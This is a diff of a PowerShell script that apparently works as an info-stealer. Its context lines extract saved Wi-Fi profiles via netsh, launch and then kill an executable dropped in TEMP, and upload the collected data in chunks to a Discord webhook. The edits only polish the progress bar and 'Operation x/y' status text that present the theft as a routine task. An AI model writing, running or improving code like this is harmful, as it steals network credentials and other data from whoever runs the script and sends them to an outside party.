@@ -123,7 +123,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     switch ($step) {
         1 {
             # Operation 1 - Extract Wi-Fi profiles
-            $textBlock.Text = "Starting Operation 1..."
+            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
             try {
                 $profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
                 $profileCount = $profiles.Count
@@ -201,7 +201,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $process = Start-Process $tempExePath # Start the executable
 
             $textBlock.Text = "Done operation 2!"
-            $textBlock.Text = "Starting operation 3..."
+            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps
 
             # Write-Output "Completed Operation 2"
         }
@@ -227,7 +227,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
             $textBlock.Text = "Done operation 3"
-            $textBlock.Text = "Starting operation 4..."
+            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
             # Write-Output "Completed Operation 3 - EXTRACT DATA"
         }
         4 {
@@ -248,9 +248,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                 }
 
-                # Calculate the progress increment based on the number of chunks
+                # Calculate total chunks for progress increment
                 $totalChunks = $chunks.Count
-                $progressIncrement = 100 / $totalChunks
+		        $currentChunks = 1
 
                 # Send each chunk to the Discord webhook
                 foreach ($chunk in $chunks) {
@@ -270,7 +270,16 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     }
 
                     # Inside the foreach loop, after each chunk is sent
-                    $progressBar.Value = [math]::Min($progressBar.Value + $progressIncrement, 100)
+                    # Update progress bar value
+                    $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
+                    $textBlock.Text = "Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+
+                    # Update the window to keep it responsive
+                    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                    # Increment to the next profile
+                    $currentChunks++
+                    Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                 
                 }
             } else {
@@ -364,6 +373,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         content = $fileContent
                     } | ConvertTo-Json
                     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                    $progressBar.Value = 100  # Set progress to complete
                 } else {
                     # Split the content into chunks of 2000 characters
                     $chunkSize = 2000
@@ -372,6 +382,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                         $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                     }
+
+                    # Calculate total chunks for progress increment
+                    $totalChunks = $chunks.Count
+		            $currentChunks = 1
     
                     # Send each chunk to the Discord webhook
                     foreach ($chunk in $chunks) {
@@ -387,6 +401,17 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         } catch {
                             # Write-Host "Error sending request: $_"
                         }
+
+                        # Update progress bar value
+                        $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
+                        $textBlock.Text = "Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+
+                        # Update the window to keep it responsive
+                        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                        # Increment to the next profile
+                        $currentChunks++
+                        Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                     }
                 }
             } else {
